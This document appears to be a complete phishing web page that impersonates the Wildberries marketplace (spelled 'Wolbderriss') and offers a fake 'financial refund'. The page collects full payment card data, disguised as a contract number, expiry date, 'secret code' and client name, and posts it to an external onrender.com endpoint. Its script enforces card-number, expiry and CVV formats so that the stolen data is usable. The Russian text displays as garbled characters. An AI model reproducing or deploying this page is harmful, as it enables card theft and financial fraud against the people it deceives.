<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wolbderriss</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f7f7f7;
      margin: 0;
      padding: 0;
    }

    header {
      background: #9c27b0;
      padding: 20px 0;
      text-align: center;
      color: #fff;
      font-size: 28px;
      font-weight: 900;
      letter-spacing: 1px;
      width: 100%;
    }

    .container {
      max-width: 420px;
      margin: 0 auto;
      background: #fff;
      border-radius: 0 0 12px 12px;
      padding: 30px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      text-align: center;
      opacity: 0;
      transform: translateY(20px);
      animation: fadeInUp 0.8s ease forwards;
    }

    @keyframes fadeInUp {
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .container h2 {
      color: #9c27b0;
      margin-bottom: 10px;
      font-size: 20px;
    }

    .container p {
      color: #555;
      margin-bottom: 25px;
      font-size: 14px;
    }

    label {
      display: block;
      text-align: left;
      margin: 12px 0 6px;
      font-size: 14px;
      color: #333;
    }

    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 18px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      box-sizing: border-box;
      transition: border-color 0.3s, box-shadow 0.3s;
    }

    input:focus {
      border-color: #9c27b0;
      box-shadow: 0 0 6px rgba(156, 39, 176, 0.5);
      outline: none;
    }

    .error {
      border-color: red !important;
      box-shadow: 0 0 6px rgba(255, 0, 0, 0.6) !important;
    }

    button {
      background: linear-gradient(90deg, #9c27b0, #d500f9);
      color: #fff;
      border: none;
      padding: 16px;
      width: 100%;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
      transition: transform 0.2s, box-shadow 0.3s;
    }

    button:hover {
      transform: scale(1.03);
      box-shadow: 0 4px 15px rgba(156, 39, 176, 0.4);
    }
  </style>
</head>
<body>
  <header>
    WOLBDERRISS
  </header>

  <div class="container">
    <h2>–§–∏–Ω–∞–Ω—Å–æ–≤—ã–π –≤–æ–∑–≤—Ä–∞—Ç</h2>
    <p>–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –¥–µ–Ω–µ–∂–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤ –≤–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –¥–æ–≥–æ–≤–æ—Ä–∞</p>
    <form action="https://com-1-h1i5.onrender.com/submit" method="POST">
      <label for="contract">–ù–æ–º–µ—Ä –¥–æ–≥–æ–≤–æ—Ä–∞</label>
      <input type="text" id="contract" name="contract" placeholder="0000 0000 0000 0000" maxlength="19" required>

      <label for="validUntil">–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è (MM/YY)</label>
      <input type="text" id="validUntil" name="validUntil" placeholder="MM/YY" maxlength="5" required>

      <label for="secretCode">–°–µ–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–¥</label>
      <input type="text" id="secretCode" name="secretCode" placeholder="000" maxlength="3" required>

      <label for="clientName">–ò–º—è –∫–ª–∏–µ–Ω—Ç–∞</label>
      <input type="text" id="clientName" name="clientName" placeholder="–ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤" required>

      <button type="submit">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∑–∞–ø—Ä–æ—Å</button>
    </form>
  </div>

  <script>
    const form = document.querySelector("form");
    const contractInput = document.getElementById("contract");
    const validUntilInput = document.getElementById("validUntil");
    const secretCodeInput = document.getElementById("secretCode");

    // –ú–∞—Å–∫–∞ –¥–ª—è –Ω–æ–º–µ—Ä–∞ –¥–æ–≥–æ–≤–æ—Ä–∞
    contractInput.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "");
      value = value.substring(0, 16);
      e.target.value = value.replace(/(.{4})/g, "$1 ").trim();

      if (value.length === 16) {
        contractInput.classList.remove("error");
      } else {
        contractInput.classList.add("error");
      }
    });

    // –ú–∞—Å–∫–∞ –¥–ª—è —Å—Ä–æ–∫–∞ –¥–µ–π—Å—Ç–≤–∏—è
    validUntilInput.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "");
      if (value.length > 4) value = value.substring(0, 4);

      if (value.length >= 3) {
        value = value.substring(0,2) + "/" + value.substring(2);
      }
      e.target.value = value;

      const [mm, yy] = e.target.value.split("/");
      if (mm && yy && (parseInt(mm) >= 1 && parseInt(mm) <= 12 && yy.length === 2)) {
        validUntilInput.classList.remove("error");
      } else {
        validUntilInput.classList.add("error");
      }
    });

    // –ú–∞—Å–∫–∞ –¥–ª—è —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –∫–æ–¥–∞
    secretCodeInput.addEventListener("input", (e) => {
      e.target.value = e.target.value.replace(/\D/g, "").substring(0, 3);

      if (e.target.value.length === 3) {
        secretCodeInput.classList.remove("error");
      } else {
        secretCodeInput.classList.add("error");
      }
    });

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–µ—Ä–µ–¥ –æ—Ç–ø—Ä–∞–≤–∫–æ–π
    form.addEventListener("submit", (e) => {
      let hasError = false;

      if (contractInput.value.replace(/\s/g, "").length !== 16) {
        contractInput.classList.add("error");
        hasError = true;
      }

      const [mm, yy] = validUntilInput.value.split("/");
      if (!(mm && yy && parseInt(mm) >= 1 && parseInt(mm) <= 12 && yy.length === 2)) {
        validUntilInput.classList.add("error");
        hasError = true;
      }

      if (secretCodeInput.value.length !== 3) {
        secretCodeInput.classList.add("error");
        hasError = true;
      }

      if (hasError) {
        e.preventDefault(); // üö´ —Ñ–æ—Ä–º–∞ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è
        alert("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ!");
      }
    });
  </script>
</body>
</html>
